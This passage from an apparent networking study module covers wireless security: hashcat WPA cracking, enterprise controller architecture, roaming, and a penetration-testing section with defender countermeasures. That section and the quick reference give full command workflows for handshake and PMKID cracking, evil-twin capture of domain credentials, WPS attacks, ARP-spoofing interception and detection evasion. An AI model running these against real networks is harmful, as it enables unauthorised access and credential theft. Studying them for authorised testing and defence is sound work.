hashcat -m 22000 /tmp/capture.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
# best64.rule applies 64 transformations: capitalise, add numbers, leet speak, etc.

# Multiple wordlists
hashcat -m 22000 /tmp/capture.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# -a 1: Combination attack (combine words from two wordlists)
hashcat -m 22000 /tmp/capture.hc22000 -a 1 wordlist1.txt wordlist2.txt
# Tries every combination: word1+word2

# -a 3: Mask attack (brute force with charset)
# ?l = lowercase a-z, ?u = uppercase A-Z, ?d = digit 0-9, ?s = special, ?a = all

# 8 characters, all lowercase
hashcat -m 22000 /tmp/capture.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# WPA minimum is 8 chars — common patterns
hashcat -m 22000 /tmp/capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d      # 8 digits
hashcat -m 22000 /tmp/capture.hc22000 -a 3 ?u?l?l?l?l?l?d?d      # Capital + 5lower + 2digit
hashcat -m 22000 /tmp/capture.hc22000 -a 3 ?u?l?l?l?l?l?l?d?d?s  # +1 special 10 chars

# -a 6: Hybrid — wordlist + mask
hashcat -m 22000 /tmp/capture.hc22000 -a 6 rockyou.txt ?d?d?d?d
# Every word in rockyou followed by any 4 digits (Password1234, summer2026, etc.)

# -a 7: Hybrid — mask + wordlist
hashcat -m 22000 /tmp/capture.hc22000 -a 7 ?d?d?d?d rockyou.txt
# 4 digits + every word in rockyou

# Status and control
hashcat -m 22000 /tmp/capture.hc22000 rockyou.txt --status --status-timer=10
# s = current status during run
# p = pause, r = resume, q = quit

# Show cracked passwords
hashcat -m 22000 /tmp/capture.hc22000 --show
```

### Pre-Computed PMK Tables (Rainbow Tables for WPA)

```bash
# genpmk — pre-compute PMKs for a specific SSID
# PMK = PBKDF2(password, SSID, 4096) — SSID is part of the derivation
# Pre-computing for "Linksys", "NETGEAR", "dlink" is practical for common SSIDs

genpmk -f rockyou.txt -d linksys.cow -s "linksys"
# -f: wordlist, -d: output PMK database (COW file), -s: SSID

# Use with cowpatty
cowpatty -r /tmp/capture-01.cap -d linksys.cow -s "linksys"
# Much faster than per-password PBKDF2 computation — but SSID-specific
```

---

## 7. Enterprise Wireless — WLC, Lightweight vs Autonomous APs, Roaming

### Enterprise Wireless Architecture

Enterprise wireless uses **WLC (Wireless LAN Controller)** to manage many APs centrally.

```
┌─────────────────────────────────────────────────┐
│            WLC (Wireless LAN Controller)         │
│  - Central configuration management             │
│  - RF management (power, channel assignment)    │
│  - Client authentication (RADIUS integration)  │
│  - Roaming coordination                         │
│  - WLAN policies, QoS, ACLs                    │
└──────────────────────┬──────────────────────────┘
                       │ CAPWAP tunnel
           ┌───────────┼───────────┐
           ▼           ▼           ▼
        [AP-1]      [AP-2]      [AP-3]
       (LWAP)      (LWAP)      (LWAP)
   Floor 1       Floor 2     Floor 3
```

### Lightweight APs vs Autonomous APs

**Autonomous AP (Fat AP)**:
- Self-contained — handles all 802.11 processing locally
- Each AP configured independently
- No controller required
- Suitable for very small deployments (1–5 APs)
- Harder to manage at scale (every AP configured separately)
- Roaming: client must re-authenticate to each AP (slow, disruptive)

**Lightweight AP (LWAP / Thin AP)**:
- Splits 802.11 functions between AP and WLC
- **CAPWAP (Control And Provisioning of Wireless Access Points)** tunnel between AP and WLC:
  - Control plane: CAPWAP UDP 5246 — AP configuration, management
  - Data plane: CAPWAP UDP 5247 — encrypted client data tunnel (or local switching)
- All configuration pushed from WLC — zero-touch provisioning
- Centralised visibility: WLC sees all clients, all traffic stats
- **Split-MAC architecture**: AP handles real-time functions (beacon, ACK, power management), WLC handles authentication, association, encryption key management

**Local vs Flex Connect (OfficeExtend)**:
- **Local mode**: All client traffic tunnelled to WLC through CAPWAP. Centralised breakout. Traffic must go to WLC before reaching internet — increases latency for remote sites.
- **FlexConnect mode**: AP can locally switch traffic (internet breakout at the branch) when connected to WLC, and continue operating if WLC connection is lost. Critical for branch offices with MPLS/SD-WAN.

### CAPWAP — Deep Dive

```
CAPWAP uses DTLS (Datagram TLS) for the control plane:
AP → WLC: AP Certificate (from factory provisioning)
WLC → AP: WLC Certificate
          → Mutual TLS authentication → Encrypted control plane

Discovery process:
1. AP boots, gets IP via DHCP (option 43 may contain WLC IP)
2. AP sends CAPWAP Discovery Request to:
   a. DHCP option 43 IP
   b. DNS: CISCO-CAPWAP-CONTROLLER.domain
   c. Local subnet broadcast
   d. Known WLC IP (if previously configured)
3. WLC responds with CAPWAP Discovery Response
4. AP selects WLC (highest capacity, best response time)
5. AP sends CAPWAP Join Request
6. WLC authenticates AP, sends full config
7. AP comes up with correct SSID/security/channel config
```

### Roaming — 802.11r, 802.11k, 802.11v

Seamless roaming is critical for VoIP, video conferencing, and real-time applications.

**Without fast roaming**:
```
Client moves from AP-1 to AP-2:
1. Detect signal degradation
2. Probe for better AP
3. Deauthenticate from AP-1
4. Full 802.11 authentication + association with AP-2
5. Full 802.1X re-authentication (if Enterprise) ← THIS TAKES 500ms-2s
6. New IP via DHCP (or same IP if sticky DHCP)
Total: potentially 1-3 seconds of disruption → VoIP call drops
```

**802.11r — Fast BSS Transition (FT)**:
- Pre-authenticates with candidate APs while still connected to current AP
- Caches PMK and security keys at candidate APs via the DS (Distribution System)
- Client roams with minimal re-authentication — sub-50ms transition
- Supported by most modern enterprise APs

**802.11k — Radio Resource Management (RRM)**:
- AP sends "neighbor reports" to clients — list of nearby APs with signal info
- Client uses this to intelligently choose roaming targets
- Prevents clients from "sticking" to weak AP when better ones are available

**802.11v — BSS Transition Management**:
- AP can suggest or force a client to roam to a better AP
- Load balancing — AP with too many clients can steer new clients to less-loaded AP
- `BSS Transition Management Request` frame sent from AP to client

```
Together: 802.11k/r/v = "Fast Transition" or "Triple-k" = enterprise roaming standard
Cisco marketing: "FastLocate" or "CleanAir" may include these features
```

### WLC Configuration (Cisco WLC CLI)

```bash
# Connect to WLC CLI
ssh admin@wlc-ip

# Show summary
show ap summary                    # All associated APs
show client summary                # All connected clients
show wlan summary                  # All configured WLANs
show interface summary             # WLC interfaces

# Show specific WLAN detail
show wlan 1

# Show client detail (by MAC)
show client detail AA:BB:CC:DD:EE:FF

# Show RF group
show rf-profile summary

# Debug
debug client AA:BB:CC:DD:EE:FF enable   # Debug specific client association
debug dot11 events enable
debug capwap events enable
```

### Cisco Meraki (Cloud-Managed AP Example)

```
No WLC required — management via cloud dashboard:
- Zero-touch provisioning: AP gets IP, calls home to Meraki cloud
- Full config pushed from dashboard
- CAPWAP replaced by Meraki's proprietary cloud protocol
- Analytics: client count, signal heatmaps, usage per SSID
- Auto RF: automatic channel and power adjustment

SSID types:
- Bridge mode: Client traffic bridged to local network
- NAT mode: Meraki AP performs NAT — clients get 192.168.x.x from AP DHCP
- Layer 3 roaming: Client keeps same IP when roaming between APs
```

---

## 8. Wireless Monitoring and Troubleshooting

### Kismet — Passive Wireless Discovery

```bash
# Install
apt install kismet

# Start with web UI (browse to http://localhost:2501)
kismet -c wlan0mon

# Start headless with output to files
kismet --no-ncurses -c wlan0mon --log-prefix /tmp/kismet-log

# Kismet logs to multiple formats:
# kismet-log.kismet  (SQLite database)
# kismet-log.pcapng  (full packet capture)

# Query SQLite database
sqlite3 kismet-log.kismet "SELECT devmac, ssid FROM devices;"

# Kismet capabilities:
# Discovers APs, clients, ad-hoc networks
# Detects WEP/WPA/WPA2/WPA3
# Identifies manufacturer from OUI
# GPS support for geolocation mapping
# Detects probe requests (client history)
# Deauth/evil twin detection
```

### Troubleshooting Wireless — Common Issues

```bash
# Check wireless adapter capabilities
iw list                              # All capabilities of all wireless adapters
iw dev wlan0 info                    # Specific adapter info
iw dev wlan0 station dump            # Connected stations (AP mode)

# Check which channels are allowed (regulatory domain)
iw reg get                           # Current regulatory domain
iw reg set GB                        # Set to GB (UK) regulations

# Check signal strength
iw dev wlan0 link                    # Signal, TX rate, BSSID of current connection
iwconfig wlan0                       # Signal level in dBm

# Scan for networks (managed mode)
iw dev wlan0 scan | grep -E 'SSID|signal|freq'

# Windows wireless troubleshooting
netsh wlan show interfaces           # Connected network details
netsh wlan show networks mode=bssid  # All visible networks with signal
netsh wlan show profiles             # Saved profiles
netsh wlan show profile name="CorpWiFi" key=clear  # Show password in cleartext
```

---

## 9. Pentest Lens — Wireless

### Pentest Lens

**Attacker's view**: Wireless networks extend the physical perimeter into open air. A laptop in the car park can attack the corporate Wi-Fi without physical access to the building. Enterprise 802.1X is significantly harder to attack than WPA2-PSK — but many organisations run both simultaneously (guest PSK on same hardware), and BYOD devices on WPA2-Personal provide an easy entry point.

**Discovery and Reconnaissance**:
```bash
# Passive discovery (no packets sent — undetectable)
# Just listen in monitor mode
airodump-ng wlan0mon
# Reveals: all SSIDs, BSSIDs, channels, encryption type, connected clients

# Identify target from probe requests (clients probing for networks)
# If client probes for "CorpOfficeVPN" → company uses that as an SSID somewhere
# Build list of interesting SSIDs to target or clone for evil twin

# Kismet for longer passive monitoring
kismet -c wlan0mon &
# Let it run for hours → complete picture of wireless environment

# GPS-enabled wardriving
kismet -c wlan0mon --gps-host=localhost:2947    # With gpsd running
# Map all APs with their physical locations
```

**Attacking WPA2-PSK (Personal Networks)**:
```bash
# Full attack workflow (covered in detail above):
airmon-ng check kill
airmon-ng start wlan0
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:01 -w /tmp/corp wlan0mon
# Wait or deauth:
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:01 -c <client-MAC> wlan0mon
# Convert and crack:
hcxpcapngtool -o corp.hc22000 /tmp/corp-01.cap
hashcat -m 22000 corp.hc22000 rockyou.txt -r best64.rule

# PMKID (no client needed):
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

**Attacking WPA2-Enterprise**:
```bash
# Goal: Capture MSCHAPv2 challenge-response → crack offline → get domain credentials

# Step 1: Deploy evil twin with hostapd-wpe (same SSID as corporate Wi-Fi)
hostapd-wpe /tmp/hostapd-wpe.conf &

# Step 2: Deauth clients from real AP to force reconnect to evil twin
aireplay-ng --deauth 0 -a <real-AP-BSSID> wlan0mon

# Step 3: Watch hostapd-wpe log for captured hashes
tail -f /var/log/hostapd-wpe.log
# [hostapd-wpe] jsmith / challenge: 1a2b3c / response: aabbcc...

# Step 4: Crack MSCHAPv2 with hashcat
hashcat -m 5600 netntlm_hash.txt rockyou.txt    # NetNTLMv2
# Or: asleap -C <challenge> -R <response> -W rockyou.txt

# Step 5: Use cracked credentials for:
# - VPN access
# - OWA/webmail
# - RDP
# - SMB (crackmapexec)
```

**Checking for WPS**:
```bash
wash -i wlan0mon    # Find WPS-enabled APs
# If WPS Locked = No: attempt Pixie Dust first
reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv   # Pixie Dust
# If Pixie Dust fails: standard PIN brute force
reaver -i wlan0mon -b <BSSID> -c <channel> -vv
```

**Post-Association — What to Do When Connected**:
```bash
# On a WPA2-PSK network with no 802.1X:
# You have Layer 2 access — treat as if you're on the wired LAN

# Host discovery (ARP-based — works regardless of ICMP blocking)
arp-scan --localnet
nmap -sn -PR 192.168.1.0/24

# LLMNR/NBT-NS poisoning (wireless clients respond to these too)
responder -I wlan0 -v

# ARP poisoning → MITM all wireless clients
arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1 &
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.50 &

# Capture cleartext credentials
bettercap -iface wlan0
> net.probe on
> arp.spoof on
> net.sniff on
```

**Misconfigurations to look for**:
```
WPA2-PSK with weak/guessable password → handshake crack
WPS enabled → Pixie Dust or PIN brute force
Mixed mode: WPA2-PSK for BYOD/Guest + Enterprise on same segment
  → Compromise PSK network → access segment with enterprise hosts
No 802.11w → deauth attacks work → force handshake capture, evil twin easier
PEAP without server certificate validation on clients → rogue RADIUS trivial
Open Wi-Fi (no encryption) → all traffic capturable passively
WPA2-Enterprise using LEAP → crackable challenge-response (LEAP is broken)
Guest Wi-Fi on same VLAN as corporate → guest → corporate pivot
2.4 GHz only SSIDs → many clients connect here → scan for them
Management interface (AP web UI) accessible from wireless client VLAN
```

**Detection evasion on wireless**:
```bash
# MAC randomisation (blend in as just another client)
# Linux: use randomised MAC before monitor mode
macchanger -r wlan0              # Random MAC
macchanger -m AA:BB:CC:DD:EE:FF wlan0   # Specific MAC

# Low-power scanning (reduce signal footprint)
# Stay on channel longer per scan iteration

# Avoid deauth against all clients — targeted deauth of single client is less noisy
aireplay-ng --deauth 2 -a <AP-BSSID> -c <specific-client> wlan0mon
# 2 deauths only → enough to capture handshake without obvious DoS

# Time attacks for low-traffic periods (lunch hour → fewer admins watching)
```

**Defender's counter**:
```
WPA3 mandatory (SAE) → PMKID/handshake attacks fail, deauth attacks fail (MFP)
WPA2-Enterprise + EAP-TLS (certificate-based) → no MSCHAPv2 to capture/crack
Validate RADIUS server certificate on all supplicants → rogue RADIUS AP fails
Disable WPS on all APs → WPS PIN attacks impossible
802.11w (MFP) on all SSIDs → deauth attacks fail
WIDS (Wireless Intrusion Detection System):
  - Detects evil twins (same SSID, different BSSID)
  - Detects deauth floods
  - Detects WPS brute force attempts
  - Rogue AP containment (APs detect rogue → report to WLC → WLC sends deauths)
Guest VLAN isolation → guests cannot reach corporate network
Client isolation → wireless clients cannot ARP-spoof each other
RF management → consistent signal strength reduces evil twin effectiveness
Certificate pinning on corporate VPN clients → even if MITM → VPN fails to connect
MAC filtering → minor, easily bypassed by spoofing an authorised MAC
```

---

## Quick Reference — Module 8

### 802.11 Standards Summary
| Standard | Wi-Fi | GHz | Max Speed |
|---------|-------|-----|----------|
| 802.11n | Wi-Fi 4 | 2.4+5 | 600 Mbps |
| 802.11ac | Wi-Fi 5 | 5 | 3.5 Gbps |
| 802.11ax | Wi-Fi 6/6E | 2.4+5+6 | 9.6 Gbps |

### Non-Overlapping Channels
| Band | Channels |
|------|---------|
| 2.4 GHz | 1, 6, 11 |
| 5 GHz (20 MHz) | 36, 40, 44, 48, 149, 153, 157, 161 |
| 6 GHz | 1–233 (odd) |

### WPA Security Comparison
| Standard | Key Exchange | Encryption | Offline Attack |
|---------|-------------|-----------|---------------|
| WEP | Static RC4 | RC4 | Trivial (40k IVs) |
| WPA-TKIP | PSK | RC4+TKIP | Difficult |
| WPA2-PSK | PSK + 4-Way HS | AES-CCMP | Dictionary (handshake) |
| WPA2-Enterprise | 802.1X | AES-CCMP | MSCHAPv2 crackable |
| WPA3-SAE | Dragonfly | AES-CCMP | Not feasible |

### aircrack-ng Attack Workflow
```bash
airmon-ng check kill
airmon-ng start wlan0                    # Monitor mode
airodump-ng wlan0mon                     # Discover targets
airodump-ng -c 6 --bssid <BSSID> -w /tmp/cap wlan0mon  # Capture
aireplay-ng --deauth 5 -a <BSSID> -c <client> wlan0mon  # Force handshake
hcxpcapngtool -o cap.hc22000 /tmp/cap-01.cap            # Convert
hashcat -m 22000 cap.hc22000 rockyou.txt                 # Crack
```

### PMKID Attack Workflow
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### hashcat Mask Charsets
| Symbol | Charset |
|--------|---------|
| ?l | a-z lowercase |
| ?u | A-Z uppercase |
| ?d | 0-9 digits |
| ?s | Special chars |
| ?a | All printable |

---

## Related Notes
- [[Module-04-Network-Security]] — 802.1X, EAP methods, RADIUS for WPA2-Enterprise
- [[Module-03-Protocols-Deep-Dive]] — RADIUS, EAP protocol internals
- [[Module-05-Firewall-Configuration]] — Segmenting wireless VLANs from corporate network
- [[Module-06-Network-Monitoring]] — WIDS, detecting wireless attacks in logs
- [[Module-10-Enterprise-Infrastructure]] — WLC placement in three-tier architecture
- [[Module-11-Tools-Reference]] — Full aircrack-ng, Kismet, hcxdumptool reference
- [[Module-12-Pentest-Perspective]] — Wireless attacks in full engagement context
